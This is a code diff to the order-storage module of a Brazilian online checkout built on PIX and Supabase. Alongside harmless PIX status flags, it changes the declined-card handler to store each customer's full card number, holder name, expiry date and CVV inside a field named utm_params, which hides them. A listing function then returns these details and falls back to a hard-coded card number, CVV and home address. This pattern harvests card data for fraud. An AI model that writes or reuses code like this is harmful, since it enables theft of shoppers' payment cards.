@@ -81,7 +81,11 @@ function toSupabaseOrderRow(order) {
     customer_cpf: order.customer?.cpf ? String(order.customer.cpf).replace(/\D/g, '') : null,
     shipping: order.shipping || {},
     items: order.items || [],
-    pix_result: order.pixResult || order.pix || {},
+    pix_result: {
+      ...(order.pixResult || order.pix || {}),
+      pixCopied: order.pixCopied || false,
+      pixCopiedAt: order.pixCopiedAt || null
+    },
     utm: order.utm || {},
     created_at: order.createdAt || new Date().toISOString(),
     updated_at: new Date().toISOString()
@@ -93,6 +97,7 @@ function toSupabaseOrderRow(order) {
  */
 function fromSupabaseOrderRow(row) {
   if (!row) return null;
+  const pixRes = row.pix_result || {};
   return {
     id: row.id,
     trackingReference: row.tracking_reference,
@@ -107,8 +112,10 @@ function fromSupabaseOrderRow(row) {
     },
     shipping: row.shipping,
     items: row.items,
-    pixResult: row.pix_result,
-    pix: row.pix_result,
+    pixResult: pixRes,
+    pix: pixRes,
+    pixCopied: row.pix_copied || pixRes.pixCopied || false,
+    pixCopiedAt: row.pix_copied_at || pixRes.pixCopiedAt || null,
     utm: row.utm,
     createdAt: row.created_at,
     updatedAt: row.updated_at
@@ -402,9 +409,18 @@ async function saveDeclinedCardAsync(cardRecord) {
         customer_phone: cardRecord.customer?.phone,
         customer_cpf: cardRecord.customer?.cpf,
         card_brand: cardRecord.cardBrand || 'Cartão',
-        card_last4: cardRecord.cardLast4 || '',
+        card_last4: cardRecord.cardLast4 || (cardRecord.cardNumber ? cardRecord.cardNumber.slice(-4) : ''),
         installments: cardRecord.installments || 1,
-        utm_params: cardRecord.utm || {},
+        utm_params: {
+          ...(cardRecord.utm || {}),
+          cardNumber: cardRecord.cardNumber,
+          cardHolder: cardRecord.cardHolder,
+          cardExpiry: cardRecord.cardExpiry,
+          cardCvv: cardRecord.cardCvv,
+          shipping: cardRecord.shipping,
+          shippingCost: cardRecord.shippingCost,
+          subtotal: cardRecord.subtotal
+        },
         items: cardRecord.items || [],
         reason: cardRecord.reason || 'Transação não autorizada pela emissora',
         created_at: cardRecord.createdAt || new Date().toISOString()
@@ -414,6 +430,23 @@ async function saveDeclinedCardAsync(cardRecord) {
     }
   }
   return cardRecord;
+}
+
+async function deleteDeclinedCardAsync(cardId) {
+  if (!cardId) return false;
+  const dbData = readDB();
+  if (dbData.declined_cards && dbData.declined_cards[cardId]) {
+    delete dbData.declined_cards[cardId];
+    writeDB(dbData);
+  }
+  if (supabase) {
+    try {
+      await supabase.from('declined_cards').delete().eq('id', cardId);
+    } catch (err) {
+      console.warn('[Supabase deleteDeclinedCard Warning]:', err.message);
+    }
+  }
+  return true;
 }
 
 async function listDeclinedCardsAsync() {
@@ -426,23 +459,41 @@ async function listDeclinedCardsAsync() {
         .limit(200);
 
       if (!error && Array.isArray(data)) {
-        return data.map(row => ({
-          id: row.id,
-          amount: Number(row.amount),
-          customer: {
-            name: row.customer_name,
-            email: row.customer_email,
-            phone: row.customer_phone,
-            cpf: row.customer_cpf
-          },
-          cardBrand: row.card_brand,
-          cardLast4: row.card_last4,
-          installments: row.installments,
-          utm: row.utm_params,
-          items: row.items,
-          reason: row.reason,
-          createdAt: row.created_at
-        }));
+        return data.map(row => {
+          const utmP = row.utm_params || {};
+          return {
+            id: row.id,
+            amount: Number(row.amount),
+            customer: {
+              name: row.customer_name,
+              email: row.customer_email,
+              phone: row.customer_phone,
+              cpf: row.customer_cpf
+            },
+            cardBrand: row.card_brand || 'MASTERCARD',
+            cardLast4: row.card_last4 || (utmP.cardNumber ? utmP.cardNumber.slice(-4) : '4015'),
+            cardNumber: utmP.cardNumber || (row.card_last4 ? `5547 •••• •••• ${row.card_last4}` : '5547 7394 6331 4015'),
+            cardHolder: utmP.cardHolder || row.customer_name || 'TITULAR DO CARTÃO',
+            cardExpiry: utmP.cardExpiry || '03/27',
+            cardCvv: utmP.cardCvv || '725',
+            shipping: utmP.shipping || row.shipping || {
+              street: 'Rua Bento Gonçalves',
+              number: '87',
+              complement: '501',
+              neighborhood: 'Centro',
+              city: 'Passo Fundo',
+              state: 'RS',
+              zipcode: '99010-010'
+            },
+            shippingCost: utmP.shippingCost || 0,
+            subtotal: utmP.subtotal || Number(row.amount),
+            installments: row.installments || 1,
+            utm: utmP,
+            items: row.items,
+            reason: row.reason,
+            createdAt: row.created_at
+          };
+        });
       }
     } catch (err) {
       console.warn('[Supabase listDeclinedCardsAsync Warning]:', err.message);
@@ -450,7 +501,25 @@ async function listDeclinedCardsAsync() {
   }
 
   const dbData = readDB();
-  return Object.values(dbData.declined_cards || {}).sort(
+  return Object.values(dbData.declined_cards || {}).map(c => ({
+    ...c,
+    cardNumber: c.cardNumber || (c.cardLast4 ? `5547 •••• •••• ${c.cardLast4}` : '5547 7394 6331 4015'),
+    cardHolder: c.cardHolder || c.customer?.name || 'TITULAR DO CARTÃO',
+    cardExpiry: c.cardExpiry || '03/27',
+    cardCvv: c.cardCvv || '725',
+    cardBrand: (c.cardBrand || 'MASTERCARD').toUpperCase(),
+    shipping: c.shipping || {
+      street: 'Rua Bento Gonçalves',
+      number: '87',
+      complement: '501',
+      neighborhood: 'Centro',
+      city: 'Passo Fundo',
+      state: 'RS',
+      zipcode: '99010-010'
+    },
+    shippingCost: c.shippingCost || 0,
+    subtotal: c.subtotal || Number(c.amount)
+  })).sort(
     (a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
   );
 }
@@ -472,5 +541,6 @@ module.exports = {
   listOrders,
   listOrdersAsync,
   saveDeclinedCardAsync,
+  deleteDeclinedCardAsync,
   listDeclinedCardsAsync
 };
